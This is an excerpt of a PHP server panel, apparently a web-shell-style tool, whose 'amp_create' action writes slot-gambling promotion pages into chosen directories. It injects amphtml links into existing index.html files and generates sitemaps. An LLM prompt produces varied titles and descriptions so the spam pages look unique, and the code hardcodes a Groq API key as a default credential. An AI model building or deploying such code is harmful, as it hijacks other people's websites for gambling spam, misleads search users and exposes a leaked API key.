...
function td_actions() {
    ...
    if ($act==='amp_create' && isset($_POST['amp_pagedev'])) {
        $root      = td_root();
        ...
        $ampFname    = basename(td_san(trim(isset($_POST['amp_fname'])?$_POST['amp_fname']:'amp.html')));
        if ($ampFname==='') $ampFname = 'amp.html';
        $pagedev     = rtrim(trim($_POST['amp_pagedev']),'/');
        ...
        $imgLogo     = isset($_POST['amp_logo'])     ? trim($_POST['amp_logo'])     : '';
        $imgBanner   = isset($_POST['amp_banner'])   ? trim($_POST['amp_banner'])   : '';
        $imgBg       = isset($_POST['amp_bg'])       ? trim($_POST['amp_bg'])       : '';
        $footerText  = isset($_POST['amp_footer'])   ? htmlspecialchars(strip_tags($_POST['amp_footer'])) : '&copy; 2024 - 2026 | '.$brandName;
        $colorRed    = isset($_POST['amp_color'])    ? trim($_POST['amp_color'])    : '#ff0033';
        $colorDark   = isset($_POST['amp_colordark'])? trim($_POST['amp_colordark']): '#80001a';
        $scheme      = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on') ? 'https' : 'http';
        $host        = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
        $groqKeyDefault = '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';
        $apiKey = isset($_POST['amp_apikey']) && trim($_POST['amp_apikey'])!=='' ? trim($_POST['amp_apikey']) : $groqKeyDefault;
        ...
        foreach ($targets as $idx => $t) {
            ...
            if ($apiKey !== '') {
                $prompt  = 'Berikan 1 judul halaman web (max 70 karakter) dan 1 deskripsi meta (max 155 karakter) untuk halaman dengan path "'.$dirRel.'". ';
                $prompt .= 'Buat judul dan deskripsi yang unik, relevan dengan konteks path tersebut, dalam bahasa Indonesia. ';
                $prompt .= 'Respond HANYA dengan JSON tanpa markdown tanpa penjelasan: {"title":"...","description":"..."}';
                ...
                if ($apiResp !== false) {
                    ...
                    if ($apiJson && isset($apiJson['choices'][0]['message']['content'])) {
                        ...
                        if ($inner && isset($inner['title']))       $title = trim($inner['title']);
                        if ($inner && isset($inner['description'])) $desc  = trim($inner['description']);
                    }
                }
            }
            ...
            if ($title === '') {
                ...
                $last  = !empty($parts) ? end($parts) : $host;
                $clean = ucwords(str_replace(array('-','_'), ' ', $last));
                $title = $clean.' - Situs Slot Gacor Terbaik 2026';
                $desc  = 'Temukan pengalaman terbaik di '.$clean.'. Situs slot gacor terpercaya dengan RTP tinggi dan jackpot terbesar 2026.';
            }

            $bannerSrc = $imgBanner !== '' ? $imgBanner : 'https://ik.imagekit.io/4vxr4rjep/dwa.webp';
            $bgSrc     = $imgBg     !== '' ? $imgBg     : $bannerSrc;
            $logoSrc   = $imgLogo   !== '' ? $imgLogo   : '';

            $content = '<!DOCTYPE html>
<html amp lang="id">
<head>
  <link rel="canonical" href="'.$dirUrl.'">
  <meta charset="UTF-8">
  ...
  <style amp-custom>
    :root{--maxw:480px;--nav-h:62px;--nav-space:75px;--c-bg:#080002;--c-red:'.htmlspecialchars($colorRed).';--c-dark-red:'.htmlspecialchars($colorDark).';--c-white:#ffffff;--c-glass:rgba(18,2,6,0.88);--c-border:rgba(255,0,51,0.5);--r-card:16px;--r-btn:10px;--shadow-hd:0 10px 30px rgba(0,0,0,0.9),0 0 20px rgba(255,0,51,0.35)}
      ...
      <div class="combo-block">
        <div class="combo-inner">
          <div class="combo-header">
            <a href="'.htmlspecialchars($dirUrl).'">'.
              ($logoSrc !== ''
                ...
                : '<span style="font-family:\'Orbitron\',sans-serif;font-weight:900;font-size:14px;color:#ff0033;letter-spacing:2px">'.htmlspecialchars($brandName).'</span>').
            '</a>
          ...
          <div class="combo-hero">
            <amp-carousel width="350" height="350" layout="responsive" type="slides" autoplay delay="2500" role="region" aria-label="Banner">
              <amp-img src="'.htmlspecialchars($bannerSrc).'" width="500" height="550" layout="responsive" alt="banner 1"></amp-img>
              <amp-img src="'.htmlspecialchars($bannerSrc).'" width="500" height="550" layout="responsive" alt="banner 2"></amp-img>
            </amp-carousel>
          </div>
        </div>
      </div>
      <div class="abonus">
        <a href="'.htmlspecialchars($linkDaftar).'" target="_blank" rel="nofollow" class="block">DAFTAR AKUN VIP</a>
        <a href="'.htmlspecialchars($linkLogin).'" target="_blank" rel="nofollow" class="block">LOGIN AKUN</a>
        <a href="'.htmlspecialchars($linkDaftar).'" target="_blank" rel="noopener noreferrer nofollow" class="block">SLOT GACOR</a>
      </div>
    </div>
      ...
      <ul>
        ...
        <li><a href="'.htmlspecialchars($linkLogin).'" target="_blank" rel="nofollow noopener noreferrer"><span class="material-icons">headset_mic</span>LIVE CHAT</a></li>
            ...
            if (@file_put_contents($dest, $content) !== false) {
                ...
                $uploadedUrls[] = array('url'=>$fileUrl,'ampurl'=>$ampUrl,'dir'=>$dirRel,'title'=>$title);
                $sitemapUrls[]  = $fileUrl;

                $perDirSitemap  = '<?xml version="1.0" encoding="UTF-8"?>'."\n";
                $perDirSitemap .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">'."\n";
                $perDirSitemap .= '  <url><loc>'.htmlspecialchars($fileUrl).'</loc><changefreq>weekly</changefreq><priority>0.8</priority></url>'."\n";
      ...
      <div class="card" id="sec-amp" style="border-color:rgba(0,229,255,0.25);box-shadow:0 0 18px rgba(0,229,255,0.05)">
        <div class="card-hdr" style="background:linear-gradient(90deg,rgba(0,180,255,0.1),var(--surface2))">
          <div class="card-title">
            ...
            <span class="badge b-cyan">Auto Generate</span>
          </div>
          <span style="font-family:var(--mono);font-size:10px;color:var(--cyan)"><?php echo count($allDirs); ?> dirs tersedia</span>
        </div>
        <div class="card-body">
          <div style="background:rgba(0,229,255,0.04);border:1px solid rgba(0,229,255,0.12);border-radius:var(--r2);padding:10px 14px;margin-bottom:14px;font-family:var(--mono);font-size:11px;color:rgba(0,200,230,0.75);line-height:1.8">
            &#x2139; Isi konfigurasi di bawah. Tools akan auto-generate halaman AMP lengkap per direktori dengan title &amp; desc unik dari AI, canonical otomatis, lalu inject <code style="color:var(--cyan)">&lt;link rel="amphtml"&gt;</code> ke index.html yang ada. Sitemap dibuat otomatis.
          </div>
          <form method="POST" action="<?php echo htmlspecialchars($baseUrl); ?>?dir=<?php echo urlencode($relDir); ?>">
            ...
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px">
              ...
              <div style="display:flex;flex-direction:column;gap:10px">
                ...
                <div style="background:var(--surface2);border:1px solid var(--border);border-radius:var(--r2);padding:12px 14px">
                  <div style="font-size:10px;color:var(--cyan);font-family:var(--mono);font-weight:700;text-transform:uppercase;letter-spacing:1px;margin-bottom:10px">&#x1F3F7; Brand &amp; Link</div>
                  <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
                    ...
                    <div>
                      <label class="form-label">Nama File AMP</label>
                      <input class="form-input" type="text" name="amp_fname" value="amp.html" style="font-family:var(--mono);font-size:12px">
                    </div>
                  </div>
                  <div style="margin-top:8px">
                    <label class="form-label">Link Daftar / CTA</label>
                    <input class="form-input" type="text" name="amp_daftar" placeholder="https://helompogame.site/" style="font-family:var(--mono);font-size:12px">
                  </div>
                  <div style="margin-top:8px">
                    <label class="form-label">Link Login / Live Chat</label>
                    <input class="form-input" type="text" name="amp_login" placeholder="https://helompogame.site/" style="font-family:var(--mono);font-size:12px">
                  </div>
                  <div style="margin-top:8px">
                    <label class="form-label">Footer Text</label>
                    <input class="form-input" type="text" name="amp_footer" placeholder="© 2024 - 2026 | BRAND x ULAR SAWAH" style="font-family:var(--mono);font-size:12px">
                  </div>
                </div>

                <div style="background:var(--surface2);border:1px solid var(--border);border-radius:var(--r2);padding:12px 14px">
                  <div style="font-size:10px;color:var(--cyan);font-family:var(--mono);font-weight:700;text-transform:uppercase;letter-spacing:1px;margin-bottom:10px">&#x1F5BC; Gambar (URL)</div>
                  <div>
                    <label class="form-label">URL Logo</label>
                    <input class="form-input" type="text" name="amp_logo" placeholder="https://... (kosong = tampilkan nama brand)" style="font-family:var(--mono);font-size:11px">
                  </div>
                  <div style="margin-top:8px">
                    <label class="form-label">URL Banner / Carousel</label>
                    <input class="form-input" type="text" name="amp_banner" placeholder="https://ik.imagekit.io/..." style="font-family:var(--mono);font-size:11px">
                  </div>
                  <div style="margin-top:8px">
                    <label class="form-label">URL Background (kosong = sama dengan banner)</label>
                    <input class="form-input" type="text" name="amp_bg" placeholder="https://... (opsional)" style="font-family:var(--mono);font-size:11px">
                  </div>
                </div>

                <div style="background:var(--surface2);border:1px solid var(--border);border-radius:var(--r2);padding:12px 14px">
                  <div style="font-size:10px;color:var(--cyan);font-family:var(--mono);font-weight:700;text-transform:uppercase;letter-spacing:1px;margin-bottom:10px">&#x1F3A8; Warna &amp; Config</div>
                  <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px">
                    <div>
                      <label class="form-label">Warna Utama</label>
                      <div style="display:flex;gap:5px;align-items:center">
                        <input type="color" name="amp_color" value="#ff0033" style="width:36px;height:32px;border:1px solid var(--border2);border-radius:4px;background:transparent;cursor:pointer;padding:2px">
                        <input class="form-input" type="text" id="ampColorHex" value="#ff0033" style="font-family:var(--mono);font-size:11px;flex:1" oninput="document.querySelector('[name=amp_color]').value=this.value">
                      </div>
                    </div>
                    <div>
                      <label class="form-label">Warna Dark</label>
                      <div style="display:flex;gap:5px;align-items:center">
                        <input type="color" name="amp_colordark" value="#80001a" style="width:36px;height:32px;border:1px solid var(--border2);border-radius:4px;background:transparent;cursor:pointer;padding:2px">
                        <input class="form-input" type="text" id="ampDarkHex" value="#80001a" style="font-family:var(--mono);font-size:11px;flex:1" oninput="document.querySelector('[name=amp_colordark]').value=this.value">
                      </div>
                    </div>
                    <div>
                      <label class="form-label">Pagedev URL</label>
                      <input class="form-input" type="text" name="amp_pagedev" placeholder="https://amp.dev" required style="font-family:var(--mono);font-size:11px">
                    </div>
                  </div>
                  <div style="margin-top:8px">
                    <label class="form-label">&#x1F916; Groq API Key <span style="color:var(--accent3);font-size:9px">&#x2705; Key default aktif</span></label>
                    <input class="form-input" type="text" name="amp_apikey" placeholder="Kosongkan untuk pakai key default" style="font-family:var(--mono);font-size:11px;color:var(--text3)">
                  </div>
                </div>
              ...
              <!-- RIGHT: dir selector -->
              <div>
                <label class="form-label">&#x1F4C1; Direktori Tujuan <span style="color:var(--text3);font-size:10px">— <span style="color:var(--cyan)">idx</span> = sudah ada index.html/php</span></label>
                ...
                <div class="dir-select-wrap" style="border-color:rgba(0,229,255,0.1);max-height:490px" id="ampDirWrap">
                  <?php foreach ($allDirs as $ad):
                    $adRel = td_rel($ad);
                    $adW   = is_writable($ad);
            ...
            <div style="margin-top:14px;display:flex;gap:9px;align-items:center;flex-wrap:wrap">
              <button class="btn" style="background:linear-gradient(135deg,rgba(0,100,180,0.8),rgba(0,200,230,0.6));color:#fff;font-size:13px;padding:11px 24px;border:1px solid rgba(0,229,255,0.4)" type="submit">
                &#x26A1; GENERATE AMP &amp; SITEMAP
              </button>
              <span style="font-size:11px;color:var(--text3);font-family:var(--mono)">AI generate title &amp; desc unik per dir &bull; amphtml inject ke index &bull; sitemap.xml per dir</span>
            </div>
          </form>
        </div>
      </div>
